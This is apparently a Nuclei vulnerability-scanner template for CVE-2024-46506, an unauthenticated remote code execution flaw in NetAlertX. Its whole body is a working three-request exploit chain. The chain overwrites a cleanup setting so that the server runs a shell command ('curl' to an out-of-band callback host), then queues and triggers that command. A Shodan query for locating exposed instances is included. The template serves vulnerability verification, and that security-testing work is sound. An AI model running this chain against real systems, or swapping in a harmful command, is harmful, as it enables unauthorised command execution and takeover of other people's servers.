id: netalertx-rce-cve-2024-46506
info:
  name: NetAlertX Unauthenticated RCE (CVE-2024-46506)
  author: mcy32
  severity: critical
  description: >
    NetAlertX exposes /php/server/util.php allowing unauthenticated settings update
    (function=savesettings). By setting the DBCLNP_CMD to invoke an outbound request
    and enqueuing execution, an attacker can achieve RCE. This template uses an
    out-of-band (Interactsh) callback for safe verification.
  reference:
    - https://rhinosecuritylabs.com/research/cve-2024-46506-rce-in-netalertx/
    - https://nvd.nist.gov/vuln/detail/CVE-2024-46506
    - https://github.com/rapid7/metasploit-framework/pull/19437
  metadata:
    verified: true
    max-request: 3
    vendor: jokobsk
    product: netalertx
    shodan-query: http.title:"NetAlertX"
  tags: cve,cve2024,netalertx,rce,oast,intrusive

variables:
  oast: "http://{{interactsh-url}}"

http:
  - raw:
      - |
        POST /php/server/util.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"function":"savesettings","settings":[["DBCLNP","DBCLNP_RUN","string","*"],["DBCLNP","DBCLNP_CMD","string","/bin/sh -c 'curl -fsSL {{oast}}'"],["DBCLNP","DBCLNP_RUN_SCHD","string","* * * * *"]]}
      - |
        POST /php/server/util.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"function":"addToExecutionQueue","action":"{{rand_text_alpha(6)}}|run|DBCLNP"}
      - |
        POST /php/server/util.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"function":"addToExecutionQueue","action":"{{rand_text_alpha(6)}}|cron_restart_backend"}

    stop-at-first-match: true
    max-redirects: 1
    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - contains_any(interactsh_protocol, 'http', 'dns')
          - status_code_1 == 200 && status_code_2 == 200 && status_code_3 == 200
